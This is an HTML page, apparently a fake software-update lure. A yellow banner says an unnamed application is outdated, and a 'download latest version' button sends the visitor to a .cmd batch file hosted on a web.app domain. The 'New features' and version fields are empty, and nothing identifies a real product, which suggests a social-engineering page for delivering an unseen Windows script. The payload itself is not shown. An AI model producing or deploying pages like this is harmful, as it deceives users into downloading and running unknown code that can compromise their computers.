<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update REQ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            max-width: 150px; /* Tùy chỉnh kích thước logo */
            height: auto;
        }

        .banner {
            background-color: #f1c40f;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 800px;
            width: 100%;
            transition: transform 0.3s ease;
            margin-bottom: 20px; /* Đẩy khoảng cách nút xuống */
        }

        .banner:hover {
            transform: scale(1.03);
        }

        .banner i {
            font-size: 24px;
            margin-right: 15px;
            font-style: normal;
        }

        .banner p {
            margin: 0;
            font-size: 16px;
            color: #333;
        }

        .container {
            text-align: center;
        }

        .update-button {
            color: inherit;
            cursor: pointer;
            font: inherit;
            margin: 0;
            overflow: visible;
            text-transform: none;
            display: inline-block;
            min-width: 120px;
            padding: 4px 12px;
            margin: 4px 0;
            max-width: 100%;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            vertical-align: middle;
            text-overflow: clip;
            touch-action: manipulation;
            color: #000;
            border: solid 2px transparent;
            background-color: rgba(0, 0, 0, 0.2);
        }
        

        button:hover,
        button:focus,
        button:active {
            border-color: rgba(0, 0, 0, 0.4);
        }

        button {
            color: inherit;
            cursor: pointer;
            font: inherit;
            margin: 0;
            overflow: visible;
            text-transform: none;
        }
button {
            display: inline-block;
            min-width: 120px;
            padding: 4px 12px;
            margin: 4px 0;
            max-width: 100%;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            vertical-align: middle;
            text-overflow: clip;
            touch-action: manipulation;
            color: #000;
            border: solid 2px transparent;
            background-color: rgba(0, 0, 0, 0.2);
        }
        button:hover,
        button:focus,
        button:active {
            border-color: rgba(0, 0, 0, 0.4);
        }
        button:active {
            border-color: transparent;
        }
        
    </style>
</head>
<body>
    <!-- Phần logo -->
    <div class="logo">
        <img src="images/logo.png" alt="Logo"> <!-- Đường dẫn tới logo -->
    </div>

    <!-- Phần banner cảnh báo -->
    <div class="banner">
        <i>&#9432;</i>
        <p>The application is outdated and no longer supported. You can still download the latest version to continue using new features.</p>
        <p>New features: </p>
        <p>Version pre </p>
    </div>

    <!-- Nút tải về phiên bản mới nhất -->
    <div class="container page-container">
        <button class="pushbutton btn-default update-button" id="Downloadlea" onclick="downloadlea()">Click here to download latest version!</button>
    </div>

    <script>
        // Hàm để chuyển hướng tới link tải phiên bản mới nhất
        function downloadlea() {
            // Link tải về phiên bản mới nhất
            var downloadUrl = "https://nbaoweb.web.app/aco.cmd"; // Thay bằng link thực tế của bạn

            // Chuyển hướng người dùng đến link tải về
            window.location.href = downloadUrl;
        }
    </script>
</body>
</html>
